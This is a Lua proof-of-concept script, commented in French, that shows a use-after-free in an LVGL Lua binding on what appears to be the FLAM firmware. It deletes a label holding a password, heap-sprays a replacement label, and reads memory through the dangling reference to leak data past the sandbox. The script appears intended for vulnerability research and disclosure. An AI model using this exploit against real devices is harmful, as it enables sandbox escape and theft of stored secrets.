-- ============================================================================
--  POC : Fuite memoire via Use-After-Free
-- ============================================================================
--
--  SCENARIO
--  --------
--  Un ecran "Parametres" affiche des donnees sensibles (mot de passe WiFi,
--  PIN, cle de chiffrement...). Quand l'ecran est ferme, les labels sont
--  supprimes. Mais un script malveillant qui a garde les references Lua
--  peut RELIRE ces donnees depuis la RAM, car le binding C ne neutralise
--  pas les pointeurs apres la suppression.
--
--  Sur le vrai firmware FLAM (avec sandbox), c'est la seule methode
--  pour acceder a des donnees en dehors de l'espace autorise.
--
-- ============================================================================

local GREEN = lv.color.hex(0x00FF41)
local RED   = lv.color.hex(0xFF0000)
local WHITE = lv.color.hex(0xFFFFFF)
local DARK  = lv.color.hex(0x0a0a0a)

local function log(msg)
    print("[POC-LEAK] " .. msg)
end

-- Fond noir
lv.obj.set_style_bg_color(window, lv.color.hex(0x000000), 0)
lv.obj.set_style_bg_opa(window, lv.OPA_COVER, 0)

-- ============================================================================
--  ETAPE 1 : Creer un label "secret" dans un ecran de configuration
-- ============================================================================
log("")
log("=== ETAPE 1 : Un label affiche un mot de passe ===")

local secret_text = "Pass: Xk9#mP2$vL"

local secret_label = lv.label.new(window)
lv.label.set_text(secret_label, secret_text)
lv.obj.set_style_text_color(secret_label, WHITE, 0)
lv.obj.align(secret_label, lv.ALIGN_TOP_MID, 0, 35)

log("  Texte affiche : \"" .. secret_text .. "\"")
log("  Le label est visible a l'ecran.")

-- Garder la reference (c'est ce que ferait un script malveillant)
local stolen_ref = secret_label

-- ============================================================================
--  ETAPE 2 : L'ecran se ferme → le label est supprime
-- ============================================================================
log("")
log("=== ETAPE 2 : Le label est supprime (del) ===")

lv.obj.del(secret_label)

log("  lv.obj.del(secret_label) → memoire C liberee.")
log("  Le label a disparu de l'ecran.")
log("  Mais stolen_ref pointe toujours vers l'ancienne adresse.")

-- ============================================================================
--  ETAPE 3 : Spray — creer un label de remplacement AU MEME ENDROIT
-- ============================================================================
log("")
log("=== ETAPE 3 : Heap spray (reutiliser le bloc memoire) ===")

-- Strategie : creer un label identique immediatement apres le del.
-- L'allocateur LVGL (best-fit) va reutiliser le bloc qu'on vient de liberer
-- car c'est exactement la meme taille (sizeof(lv_label_t)).
local replacement = lv.label.new(window)
lv.label.set_text(replacement, "Bienvenue dans le jeu !")
lv.obj.set_style_text_color(replacement, WHITE, 0)
lv.obj.align(replacement, lv.ALIGN_TOP_MID, 0, 35)

log("  Nouveau label cree avec : \"Bienvenue dans le jeu !\"")
log("  L'allocateur a probablement reutilise le meme bloc.")

-- ============================================================================
--  ETAPE 4 : Lire via le dangling pointer
-- ============================================================================
log("")
log("=== ETAPE 4 : Lecture via le dangling pointer ===")
log("")
log("  stolen_ref pointe vers l'ANCIEN label (supprime).")
log("  Mais la memoire a ete reutilisee par le nouveau label.")
log("  get_text(stolen_ref) va lire le texte du NOUVEAU label,")
log("  prouvant qu'on accede a de la memoire qui ne nous appartient pas.")
log("")

-- La magie : lv.label.get_text(stolen_ref) ne sait pas que l'objet
-- a ete supprime. Il lit la structure lv_label_t a l'adresse stockee
-- dans le userdata — qui est maintenant occupee par 'replacement'.
local leaked = lv.label.get_text(stolen_ref)

log("  >>> lv.label.get_text(stolen_ref) = \"" .. tostring(leaked) .. "\"")
log("")

-- ============================================================================
--  ETAPE 5 : Afficher la preuve a l'ecran
-- ============================================================================

-- Titre
local title = lv.label.new(window)
lv.label.set_text(title, "Use-After-Free : fuite memoire")
lv.obj.set_style_text_color(title, RED, 0)
lv.obj.align(title, lv.ALIGN_TOP_MID, 0, 60)

-- Encadre avec le style terminal
local box = lv.obj.new(window)
lv.obj.set_size(box, 290, 100)
lv.obj.align(box, lv.ALIGN_CENTER, 0, 15)
lv.obj.set_style_bg_color(box, DARK, 0)
lv.obj.set_style_bg_opa(box, lv.OPA_COVER, 0)
lv.obj.set_style_radius(box, 6, 0)
lv.obj.remove_flag(box, lv.OBJ_FLAG_SCROLLABLE)

-- Ligne 1 : ce qu'on a demande
local line1 = lv.label.new(box)
lv.label.set_text(line1, "> get_text( label SUPPRIME )")
lv.obj.set_style_text_color(line1, GREEN, 0)
lv.obj.align(line1, lv.ALIGN_TOP_LEFT, 8, 8)

-- Ligne 2 : le resultat
local line2 = lv.label.new(box)
if leaked and #leaked > 0 then
    lv.label.set_text(line2, "= \"" .. leaked .. "\"")
    lv.obj.set_style_text_color(line2, GREEN, 0)
else
    lv.label.set_text(line2, "= (vide ou crash)")
    lv.obj.set_style_text_color(line2, RED, 0)
end
lv.obj.align(line2, lv.ALIGN_TOP_LEFT, 8, 30)

-- Ligne 3 : explication
local line3 = lv.label.new(box)
lv.label.set_text(line3, "Donnee lue APRES suppression !")
lv.obj.set_style_text_color(line3, RED, 0)
lv.obj.align(line3, lv.ALIGN_TOP_LEFT, 8, 55)

-- Verdict en bas
local verdict = lv.label.new(box)
if leaked == "Bienvenue dans le jeu !" then
    -- Le spray a reutilise le meme bloc : on lit les donnees du remplacement
    lv.label.set_text(verdict, "Bloc reutilise — lecture cross-objet")
    lv.obj.set_style_text_color(verdict, GREEN, 0)
    log("  RESULTAT : le dangling pointer lit les donnees du nouveau label.")
    log("  C'est une lecture CROSS-OBJET : on accede a un objet")
    log("  a travers la reference d'un autre objet supprime.")
elseif leaked == secret_text then
    -- Le bloc n'a pas ete reutilise : on lit les anciennes donnees residuelles
    lv.label.set_text(verdict, "Donnees residuelles en RAM !")
    lv.obj.set_style_text_color(verdict, RED, 0)
    log("  RESULTAT : le mot de passe est TOUJOURS LISIBLE en RAM")
    log("  apres la suppression du label ! Les donnees residuelles")
    log("  n'ont pas ete effacees de la memoire.")
else
    lv.label.set_text(verdict, "Memoire corrompue/reutilisee")
    lv.obj.set_style_text_color(verdict, RED, 0)
    log("  RESULTAT : donnees inattendues — la memoire a ete reutilisee")
    log("  par un autre type d'objet. Les octets lus sont du bruit.")
end
lv.obj.align(verdict, lv.ALIGN_TOP_LEFT, 8, 75)

log("")
log("  Regardez l'ecran de l'emulateur pour la preuve visuelle.")
log("  Fermez la fenetre pour quitter.")
